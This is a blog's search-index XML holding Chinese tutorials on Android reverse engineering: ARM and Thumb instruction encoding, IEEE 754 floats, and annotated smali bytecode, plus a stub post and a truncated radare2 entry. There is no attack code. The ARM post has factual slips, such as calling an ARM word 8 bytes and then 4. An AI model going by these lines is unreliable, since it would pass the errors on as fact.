<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>内存地址对齐</title>
      <link href="/2019/02/22/%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E5%AF%B9%E9%BD%90/"/>
      <url>/2019/02/22/%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E5%AF%B9%E9%BD%90/</url>
      
        <content type="html"><![CDATA[<p>原文链接：<a href="https://blog.csdn.net/spch2008/article/details/29560989" target="_blank" rel="noopener">https://blog.csdn.net/spch2008/article/details/29560989</a></p><p>//TODO</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内存地址对齐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android逆向之arm汇编</title>
      <link href="/2019/02/21/Android%E9%80%86%E5%90%91%E4%B9%8Barm%E6%B1%87%E7%BC%96/"/>
      <url>/2019/02/21/Android%E9%80%86%E5%90%91%E4%B9%8Barm%E6%B1%87%E7%BC%96/</url>
      
        <content type="html"><![CDATA[<h1 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h1><p>ARM CPU有15个通用寄存器，分别编号为R0~R15。其中R13也叫SP，用于保存栈顶地址；R14也叫LR，用于保存函数的返回地址；R15也叫PC，由于ARM架构的指令预读，实际运行时PC寄存器并不指向当前执行的指令，而是指向当前指令地址加8处。</p><p>有关所有ARM指令的文档下载链接如下：</p><p><a href="http://bear.ces.cwru.edu/eecs_382/ARM7-TDMI-manual-pt1.pdf" target="_blank" rel="noopener">http://bear.ces.cwru.edu/eecs_382/ARM7-TDMI-manual-pt1.pdf</a></p><p><a href="http://bear.ces.cwru.edu/eecs_382/ARM7-TDMI-manual-pt2.pdf" target="_blank" rel="noopener">http://bear.ces.cwru.edu/eecs_382/ARM7-TDMI-manual-pt2.pdf</a></p><p><a href="http://bear.ces.cwru.edu/eecs_382/ARM7-TDMI-manual-pt3.pdf" target="_blank" rel="noopener">http://bear.ces.cwru.edu/eecs_382/ARM7-TDMI-manual-pt3.pdf</a></p><h2 id="指令样例"><a href="#指令样例" class="headerlink" title="指令样例"></a>指令样例</h2><h3 id="B-BL"><a href="#B-BL" class="headerlink" title="B/BL"></a>B/BL</h3><p>B/BL指令是最常用的几条指令，作用是跳转到指定的位置，相关的文档解释在ARM7-TDMI-manual-pt2.pdf的4-8页。</p><p>指令的二进制解释图：</p><p><img src="https://gslab.qq.com/data/attachment/portal/201604/25/165915tb4l4ya6t4m4s0l4.png" alt="image"></p><p>Cond位表示这条指令是会在何种条件下执行，具体到实际中每个条件都会给B指令加上后缀，比如“BNE/BEQ/BGT”等，也就是我们熟悉的条件跳转指令，作为程序的分支使用。</p><p>如图是IDA反汇编中一个条件跳转示例：</p><p><img src="https://gslab.qq.com/data/attachment/portal/201604/25/165915stmeyibm3tt3bdt6.png" alt="image"></p><p>图中两条指令表示“如果R2等于R0则跳转到0x1C04”。</p><p>“101”则是B指令的标识码。</p><p>L位表示是否需要保存该指令的下一条指令到LR寄存器，这类B指令就叫BL指令，一般用于跳转到函数内部，其中LR保存返回地址。</p><p>Offset是目标地址与该指令的相对偏移（需要考虑到CPU的指令预读，以及左移两位，偏移是按4字节对齐的）。</p><p>下面还是按上图的那条指令作例子实际分析各个字段的意思：</p><p><img src="https://gslab.qq.com/data/attachment/portal/201604/25/165915rs4kes166z1ohn6b.png" alt="image"></p><p>对应二进制</p><p><img src="https://gslab.qq.com/data/attachment/portal/201604/25/165915e6i436370q3j0t4i.png" alt="image"></p><p>按照二进制解释图中的格式排列（从高位到低位）就是：</p><p>0000 - 101 - 0 - 0000 0000 0000 0000 0000 1011</p><p>Cond - op -    L -    offset</p><p>Cond表示EQ，等于的时候跳转（ARM7-TDMI-manual-pt2.pdf的4-5页）。</p><p>101是标识。</p><p>L是0，表示不需要保存下一条指令。</p><p>Offset是1011，左移两位就是101100，也就是0x2C。当CPU执行到该指令时（0x1BD0处），PC应该指向0x1BD8，所以实际跳转地址就是0x1BD8+0x2C，也就是0x1C04。</p><h3 id="LDR-STR"><a href="#LDR-STR" class="headerlink" title="LDR/STR"></a>LDR/STR</h3><p>LDR/STR指令用于向内存读/写数据，相关文档在ARM7-TDMI-manual-pt2.pdf的4-28页。</p><p>指令的二进制解释如图：</p><p><img src="https://gslab.qq.com/data/attachment/portal/201604/25/165916x3h9hjhk469jhz64.png" alt="image"></p><p>看起来很复杂，但我们需要关注的地方不多。不再做详细解释，直接看例子：</p><p>指令</p><p><img src="https://gslab.qq.com/data/attachment/portal/201604/25/165916axk9zbx8xwnv1vku.png" alt="image"></p><p>对应二进制</p><p><img src="https://gslab.qq.com/data/attachment/portal/201604/25/165916phb4kbgkm46jk2b4.png" alt="image"></p><p>按照二进制格式排列：</p><p>1110 - 01 - 011001 - 1100 - 0010 - 0000 0000 0000</p><p>Cond - op -    IPUBWL - Rn - Rd - Offset</p><p>Cond表示任何条件都可以（ARM7-TDMI-manual-pt2.pdf的4-5页）。</p><p>01是指令标识。</p><p>I是0，表示offset是一个立即数。</p><p>B是0，表示传输的是一个字，ARM指令集中的“字”是8个字节。</p><p>L是1，表示是读内存。</p><p>Rn是0xC，表示基址寄存器是R12.</p><p>Rd是2，表示把内存值读到R2。</p><p>Offset是0，表示基址寄存器需要加上0.</p><p>所以解释成指令就是：</p><p><img src="https://gslab.qq.com/data/attachment/portal/201604/25/165916axk9zbx8xwnv1vku.png" alt="image"></p><p>意思就是，读取R12寄存器指向的内存到R2寄存器中，一共读取4个字节（一个字）。</p><h1 id="Thumb"><a href="#Thumb" class="headerlink" title="Thumb"></a>Thumb</h1><p>THUMB指令是ARM指令的精简版，在日常的分析中也经常会碰到，具体的文档在ARM7-TDMI-manual-pt3.pdf。分析方法同上，不再缀述。一段程序中有可能同时出现这两种指令集，主要靠CPSR寄存器中的标识位确定当前执行的是何种指令集：</p><p><img src="https://gslab.qq.com/data/attachment/portal/201604/25/165916j1md2u4b2w3u3npu.png" alt="image"></p><p>红框即是当前指令集状态，1表示在THUMB指令集，0表示在ARM指令集。</p><h1 id="函数传参"><a href="#函数传参" class="headerlink" title="函数传参"></a>函数传参</h1><p>从汇编层面来看，不同的编译方式对函数传参的做法不同，一种比较常见的做法是把前四个参数放到R0~3寄存器中，剩下的参数放到栈中，函数的返回值放在R0中。</p><p>如图，C语言中一个简单的函数调用：</p><p><img src="https://gslab.qq.com/data/attachment/portal/201604/25/165917xoassssgmmfaegpg.png" alt="image"></p><p>调用它的汇编代码则是：</p><p><img src="https://gslab.qq.com/data/attachment/portal/201604/25/165917vv2ypprlpdo66ulb.png" alt="image"></p><p>可以看到，调用R6中的函数（old_compile）后，把返回值作为参数直接调用hasHooked函数。</p><h1 id="浮点数基础"><a href="#浮点数基础" class="headerlink" title="浮点数基础"></a>浮点数基础</h1><p>在看汇编代码的时候，有时候会碰到浮点数以及浮点指令，这里简单说说浮点数在内存中的二进制形式。具体就是IEEE 754标准。</p><p>32位浮点数的二进制格式如图：</p><p><img src="https://gslab.qq.com/data/attachment/portal/201604/25/165917ck8wav68ttwtjeva.png" alt="image"></p><p>S为符号位，Exp为指数位，Fraction为有效数字。 指数部分即使用所谓的偏正值形式表示，偏正值为实际的指数大小与一个固定值（32位的情况是127）的和。采用这种方式表示的目的是简化比较。因为，指数的值可能为正也可能为负，如果采用补码表示的话，全体符号位S和Exp自身的符号位将导致不能简单的进行大小比较。正因为如此，指数部分通常采用一个无符号的正数值存储。单精度的指数部分是−126～+127加上偏移值127，指数值的大小从1～254（0和255是特殊值）。浮点小数计算时，指数值减去偏正值将是实际的指数大小。（摘自维基百科<a href="https://zh.wikipedia.org/wiki/IEEE_754）" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/IEEE_754）</a></p><p>具体来看个例子，浮点数十六进制：</p><p>00 00 80 3F</p><p>也就是0x3F800000</p><p>二进制</p><p>0    01111111    000 0000 0000 0000 0000 0000</p><p>S    Exp    Fraction</p><p>S为0，代表这是一个正数。</p><p>Exp为0x7F，根据偏正值定义，真实值是0x7F-0x7F=0。</p><p>Fraction为0，注意，这里的Fraction是二进制小数。例如，Fraction为1011001则对应二进制小数1.1011001（整数部分恒为1，后接二进制小数），转换成十进制就是2^(-0)+2^(-1)+2^(-3)+2^(-4)+2^(-7).</p><p>计算方法就是（S）F*2^E，其中S是符号位，E是指数位Exp，F是有效位Fraction。</p><p>所以这个值就是+2^(-0)，也就是1.</p>]]></content>
      
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> arm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android逆向之smali语法</title>
      <link href="/2019/02/21/Android%E9%80%86%E5%90%91%E4%B9%8Bsmali%E8%AF%AD%E6%B3%95/"/>
      <url>/2019/02/21/Android%E9%80%86%E5%90%91%E4%B9%8Bsmali%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">public class MainActivity extends Activity implements View.OnClickListener &#123;</span><br><span class="line"></span><br><span class="line">    private String TAG = &quot;MainActivity&quot;;</span><br><span class="line">    private static final float pi = (float) 3.14;</span><br><span class="line"></span><br><span class="line">    public volatile boolean running = false;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void onClick(View view) &#123;</span><br><span class="line">        int result = add(4, 5);</span><br><span class="line">        System.out.println(result);</span><br><span class="line"></span><br><span class="line">        result = sub(9, 3);</span><br><span class="line"></span><br><span class="line">        if (result &gt; 4) &#123;</span><br><span class="line">            log(result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int add(int x, int y) &#123;</span><br><span class="line">        return x + y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public synchronized int sub(int x, int y) &#123;</span><br><span class="line">        return x + y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void log(int result) &#123;</span><br><span class="line">        Log.d(&quot;MainActivity&quot;, &quot;the result:&quot; + result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其对应的smali代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line">#文件头描述</span><br><span class="line">.class public Lcom/social_touch/demo/MainActivity;</span><br><span class="line">.super Landroid/app/Activity;#指定MainActivity的父类</span><br><span class="line">.source &quot;MainActivity.java&quot;#源文件名称</span><br><span class="line"></span><br><span class="line">#表明实现了View.OnClickListener接口</span><br><span class="line"># interfaces</span><br><span class="line">.implements Landroid/view/View$OnClickListener;</span><br><span class="line"></span><br><span class="line">#定义float静态字段pi</span><br><span class="line"># static fields</span><br><span class="line">.field private static final pi:F = 3.14f</span><br><span class="line"></span><br><span class="line">#定义了String类型字段TAG</span><br><span class="line"># instance fields</span><br><span class="line">.field private TAG:Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">#定义了boolean类型的字段running</span><br><span class="line">.field public volatile running:Z</span><br><span class="line"></span><br><span class="line">#构造方法,如果你还纳闷这个方法是怎么出来的化,就去看看jvm的基础知识吧</span><br><span class="line"># direct methods</span><br><span class="line">.method public constructor &lt;init&gt;()V</span><br><span class="line">    .locals 1#表示函数中使用了一个局部变量</span><br><span class="line"></span><br><span class="line">    .prologue#表示方法中代码正式开始</span><br><span class="line">    .line 8#表示对应与java源文件的低8行</span><br><span class="line">    #调用Activity中的init()方法</span><br><span class="line">    invoke-direct &#123;p0&#125;, Landroid/app/Activity;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    .line 10</span><br><span class="line">    const-string v0, &quot;MainActivity&quot;</span><br><span class="line"></span><br><span class="line">    iput-object v0, p0, Lcom/social_touch/demo/MainActivity;-&gt;TAG:Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    .line 13</span><br><span class="line">    const/4 v0, 0x0</span><br><span class="line"></span><br><span class="line">    iput-boolean v0, p0, Lcom/social_touch/demo/MainActivity;-&gt;running:Z</span><br><span class="line"></span><br><span class="line">    return-void</span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line">#静态方法log()</span><br><span class="line">.method public static log(I)V</span><br><span class="line">    .locals 3</span><br><span class="line">    .parameter &quot;result&quot;#表示result参数</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line 42</span><br><span class="line">    #v0寄存器中赋值为&quot;MainActivity&quot;</span><br><span class="line">    const-string v0, &quot;MainActivity&quot;</span><br><span class="line">    #创建StringBuilder对象,并将其引用赋值给v1寄存器</span><br><span class="line">    new-instance v1, Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">    #调用StringBuilder中的构造方法</span><br><span class="line">    invoke-direct &#123;v1&#125;, Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    #v2寄存器中赋值为ther result:</span><br><span class="line">    const-string v2, &quot;the result:&quot;</span><br><span class="line"></span><br><span class="line">    #&#123;v1,v2&#125;大括号中v1寄存器中存储的是StringBuilder对象的引用.</span><br><span class="line">    #调用StringBuilder中的append(String str)方法,v2寄存器则是参数寄存器.</span><br><span class="line">    invoke-virtual &#123;v1, v2&#125;, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">    #获取上一个方法的执行结果,此时v1中存储的是append()方法执行后的结果,此处之所以仍然返回v1的    #原因在与append()方法返回的就是自身的引用</span><br><span class="line">    move-result-object v1</span><br><span class="line"></span><br><span class="line">    #继续调用append方法(),p0表示第一个参数寄存器,即上面提到的result参数</span><br><span class="line">    invoke-virtual &#123;v1, p0&#125;, Ljava/lang/StringBuilder;-&gt;append(I)Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">    #同上</span><br><span class="line">    move-result-object v1</span><br><span class="line"></span><br><span class="line">    #调用StringBuilder对象的toString()方法</span><br><span class="line">    invoke-virtual &#123;v1&#125;, Ljava/lang/StringBuilder;-&gt;toString()Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    #获取上一个方法执行结果,toString()方法返回了一个新的String对象,因此v1中此时存储了String对象的引用</span><br><span class="line">    move-result-object v1</span><br><span class="line"></span><br><span class="line">    #调用Log类中的静态方法e().因为e()是静态方法,因此&#123;v0,v1&#125;中的成了参数寄存器</span><br><span class="line">    invoke-static &#123;v0, v1&#125;, Landroid/util/Log;-&gt;d(Ljava/lang/String;Ljava/lang/String;)I</span><br><span class="line"></span><br><span class="line">    .line 43</span><br><span class="line">    #调用返回指令,此处没有返回任何值</span><br><span class="line">    return-void</span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># virtual methods</span><br><span class="line">.method public add(II)I</span><br><span class="line">    .locals 1</span><br><span class="line">    .parameter &quot;x&quot;#第一个参数</span><br><span class="line">    .parameter &quot;y&quot;#第二个参数</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line 34</span><br><span class="line"></span><br><span class="line">    #调用add-int指令求和之后将结果赋值给v0寄存器</span><br><span class="line">    add-int v0, p1, p2</span><br><span class="line"></span><br><span class="line">    #返回v0寄存器中的值</span><br><span class="line">    return v0</span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.method public onClick(Landroid/view/View;)V</span><br><span class="line">    .locals 4</span><br><span class="line">    .parameter &quot;view&quot; #参数view</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    const/4 v3, 0x4 #v3寄存器中赋值为4</span><br><span class="line"></span><br><span class="line">    .line 23#java源文件中的第23行</span><br><span class="line">    const/4 v1, 0x5#v1寄存器中赋值为5</span><br><span class="line"></span><br><span class="line">    #调用add()方法</span><br><span class="line">    invoke-virtual &#123;p0, v3, v1&#125;, Lcom/social_touch/demo/MainActivity;-&gt;add(II)I</span><br><span class="line"></span><br><span class="line">    #从v0寄存器中获取add方法的执行结果</span><br><span class="line">    move-result v0</span><br><span class="line"></span><br><span class="line">    .line 24#java源文件中的24行</span><br><span class="line">    .local v0, result:I</span><br><span class="line"></span><br><span class="line">    #v1寄存器中赋值为PrintStream对象的引用out</span><br><span class="line">    sget-object v1, Ljava/lang/System;-&gt;out:Ljava/io/PrintStream;</span><br><span class="line"></span><br><span class="line">    #执行out对象的println()方法</span><br><span class="line">    invoke-virtual &#123;v1, v0&#125;, Ljava/io/PrintStream;-&gt;println(I)V</span><br><span class="line"></span><br><span class="line">    .line 26</span><br><span class="line"></span><br><span class="line">    const/16 v1, 0x9#v1寄存器中赋值为9</span><br><span class="line">    const/4 v2, 0x3#v2寄存器中赋值为3</span><br><span class="line"></span><br><span class="line">    #调用sub()方法,&#123;p0,v1,v2&#125;,p0指的是this,即当前对象,v1,v2则是参数</span><br><span class="line">    invoke-virtual &#123;p0, v1, v2&#125;, Lcom/social_touch/demo/MainActivity;-&gt;sub(II)I</span><br><span class="line">    #从v0寄存器中获取sub()方法的执行结果</span><br><span class="line">    move-result v0</span><br><span class="line"></span><br><span class="line">    .line 28</span><br><span class="line">    if-le v0, v3, :cond_0#如果v0寄存器的值小于v3寄存器中的值,则跳转到cond_0处继续执行</span><br><span class="line"></span><br><span class="line">    .line 29</span><br><span class="line"></span><br><span class="line">    #调用静态方法log()</span><br><span class="line">    invoke-static &#123;v0&#125;, Lcom/social_touch/demo/MainActivity;-&gt;log(I)V</span><br><span class="line"></span><br><span class="line">    .line 31</span><br><span class="line">    :cond_0</span><br><span class="line">    return-void</span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line">.method protected onCreate(Landroid/os/Bundle;)V</span><br><span class="line">    .locals 1</span><br><span class="line">    .parameter &quot;savedInstanceState&quot; #参数savedInstancestate</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line 17</span><br><span class="line"></span><br><span class="line">    #调用父类方法onCreate()</span><br><span class="line">    invoke-super &#123;p0, p1&#125;, Landroid/app/Activity;-&gt;onCreate(Landroid/os/Bundle;)V</span><br><span class="line"></span><br><span class="line">    .line 18</span><br><span class="line"></span><br><span class="line">    const v0, 0x7f04001a#v0寄存器赋值为0x7f04001a</span><br><span class="line"></span><br><span class="line">    #调用方法setContentView()</span><br><span class="line">    invoke-virtual &#123;p0, v0&#125;, Lcom/social_touch/demo/MainActivity;-&gt;setContentView(I)V</span><br><span class="line"></span><br><span class="line">    .line 19</span><br><span class="line">    return-void</span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line">#declared-synchronized表示该方法是同步方法</span><br><span class="line">.method public declared-synchronized sub(II)I</span><br><span class="line">    .locals 1</span><br><span class="line">    .parameter &quot;x&quot;</span><br><span class="line">    .parameter &quot;y&quot;</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line 38</span><br><span class="line"></span><br><span class="line">    monitor-enter p0#为该方法添加锁对象p0</span><br><span class="line">     add-int v0, p1, p2</span><br><span class="line">    #释放锁对象</span><br><span class="line">    monitor-exit p0</span><br><span class="line"></span><br><span class="line">    return v0</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure></p><h1 id="方法调用与结果返回"><a href="#方法调用与结果返回" class="headerlink" title="方法调用与结果返回"></a>方法调用与结果返回</h1><p>invoke-kind{},meth@BBBB：大括号中其实是调用该方法的实例+参数列表。</p><p>invoke-kind/range{},meth@BBBB：当方法的参数多于5个时（含5个），不能直接使用以上的指令，而是在后面加上“/range”，使用方法也有所不同。</p><p>move-result-xx：如果调用的函数返回非void，那么还需要用到move-result（返回基本数据类型）和move-result-object（返回对象）指令。</p><h1 id="条件跳转分支"><a href="#条件跳转分支" class="headerlink" title="条件跳转分支"></a>条件跳转分支</h1><p>“if-eq vA, vB, :cond_<strong>“   如果vA等于vB则跳转到:cond_</strong><br>“if-ne vA, vB, :cond_<strong>“   如果vA不等于vB则跳转到:cond_</strong><br>“if-lt vA, vB, :cond_<strong>“    如果vA小于vB则跳转到:cond_</strong><br>“if-ge vA, vB, :cond_<strong>“   如果vA大于等于vB则跳转到:cond_</strong><br>“if-gt vA, vB, :cond_<strong>“   如果vA大于vB则跳转到:cond_</strong><br>“if-le vA, vB, :cond_<strong>“    如果vA小于等于vB则跳转到:cond_</strong><br>“if-eqz vA, :cond_<strong>“   如果vA等于0则跳转到:cond_</strong><br>“if-nez vA, :cond_<strong>“   如果vA不等于0则跳转到:cond_</strong><br>“if-ltz vA, :cond_<strong>“    如果vA小于0则跳转到:cond_</strong><br>“if-gez vA, :cond_<strong>“   如果vA大于等于0则跳转到:cond_</strong><br>“if-gtz vA, :cond_<strong>“   如果vA大于0则跳转到:cond_</strong><br>“if-lez vA, :cond_*<em>“    如果vA小于等于0则跳转到:cond_</em>  </p><h1 id="句法"><a href="#句法" class="headerlink" title="句法"></a>句法</h1><p>其基本要求如下</p><ul><li>指令以操作码 op 开始，后面直接跟上一个或者多个参数，参数间以逗号分隔。</li><li>指令的参数从指令第一部分开始，op 位于低 8 位，高 8 位可以是一个 8 位的参数，也可以是两个 4 位的参数，还可以为空。如果指令超过 16 位，则后面部分依次作为参数。</li><li>参数Vx表示寄存器，如 v0、v1 等。这里之所以采用 v 而不用 r 是为了避免与实现该虚拟机架构的机器架构中的寄存器命名产生冲突。</li><li>参数 #+X 表示常量数字。</li><li>参数 +X 表示相对指令的地址偏移。</li><li>参数 kind@X 表示常量池索引值，其中 kind 表示常量池类型，可以是以下四种类型<ul><li>string，字符串常量池索引</li><li>type，类型常量池索引</li><li>field，字段常量池索引</li><li>meth，方法常量池索引</li></ul></li><li>以指令 op vAA, type@BBBB 为例，指令使用了 1 个寄存器 vAA，一个 32 位的类型常量池索引。</li></ul><h1 id="指令特点"><a href="#指令特点" class="headerlink" title="指令特点"></a>指令特点</h1><p>Dalvik 指令在调用规范上大致模仿常见的架构和 C 样式的调用规范，如下</p><ul><li><p>参数顺序为 Dest-then-source 。</p></li><li><p>利用后缀用来表明运算类型，从而消除歧义：</p><ul><li>正常的 32 位运算不标记。</li><li>正常地 64 位运算以 -wide 为后缀。</li><li>特定类型的运算码以其类型（或简单缩写）为后缀，这些类型包括：-boolean、-byte、-char、-short、-int、-long、-float、-double、-object、-string、-class 和 -void。</li></ul></li><li>利用运算码部分后缀区分具有不同指令样式或者或选项的相同运算，这些后缀与主要名称之间以 / 分开，主要目的是使生成和解析可执行文件的代码中存在与静态常量的一对一映射关系，以便于降低让读者感到模糊不清的可能性。</li></ul><p>例如，在指令move-wide/from16 vAA, vBBBB 中</p><ul><li>move为基础运算码，表示这是基本运算，用来移动寄存器的值。</li><li>wide为名称后缀，表示指令对 64 位数据进行运算。</li><li>from16为运算码后缀，表示源为一个 16 位寄存器的引用变量。</li><li>vAA为目的寄存器，取值范围为 v0 - v255。</li><li>vBBBB为源寄存器，取值范围为 v0 - v65535。</li></ul><h1 id="锁指令"><a href="#锁指令" class="headerlink" title="锁指令"></a>锁指令</h1><p>锁指令用于在多线程程序。包含以下两个指令</p><p>monitor-enter vAA    为指定的对象获取锁</p><p>monitor-exit vAA    释放指定的对象的锁</p>]]></content>
      
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> smali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>radare2学习笔记二</title>
      <link href="/2019/01/21/radare2-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
      <url>/2019/01/21/radare2-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/</url>
      
